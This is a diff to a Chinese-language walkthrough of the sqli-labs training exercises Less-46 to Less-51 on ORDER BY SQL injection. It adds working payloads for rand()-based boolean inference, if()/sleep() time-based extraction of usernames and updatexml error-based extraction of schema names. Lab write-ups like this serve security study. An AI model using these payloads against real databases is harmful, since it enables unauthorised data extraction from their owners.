@@ -1154,12 +1154,9 @@ password的闭合方式为`')`,但是在测试闭合方式时没有报错信息,
 
 ### Less-46
 
-`order by`注入
+`order by`注入,不需要进行闭合
 
-
-
-
-1. 利用`rand`进行盲注
+1. 利用`rand`进行注入
 
 `select * from users order by rand(0);`
 
@@ -1172,4 +1169,47 @@ password的闭合方式为`')`,但是在测试闭合方式时没有报错信息,
 例如`select * from users order by rand(length(database())=8);`可以根据回显数据排序的方式的不同来判断`database`名称的长度
 
 `select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))<50);`二分法确定名字
+
+2. 利用`if`进行延时注入
+
+`select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))>100,1,sleep(0.1)));`
+
+如果`group_concat(username)`的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于`sleep(0.1)`,而是与其查询的数据的条目数量相关,`延迟时间 = sleeptime * number`)
+
+3. 利用`updatexml`等进行报错注入
+
+```sql
+mysql> select * from users order by updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
+```
+
+### Less-47
+
+`order by`注入,闭合方式为`'`
+
+可以使用`if`进行延时注入,也可以使用`updatexml`等进行报错注入
+
+### Less-48
+
+`order by`注入,不需要进行闭合
+
+可以使用`if`进行延时注入,也可以使用`rand`等进行注入
+
+### Less-49
+
+`order by`注入,闭合方式为`'`
+
+可以使用`if`进行延时注入
+
+### Less-50
+
+`order by`注入,不需要进行闭合,同时也可以使用堆叠注入
+
+可以使用`rand`,`if`,`updatexml`进行注入
+
+### Less-51
+
+`order by`注入,闭合方式为`'`,同时也可以使用堆叠注入
+
+可以使用`if`,`updatexml`进行注入
 
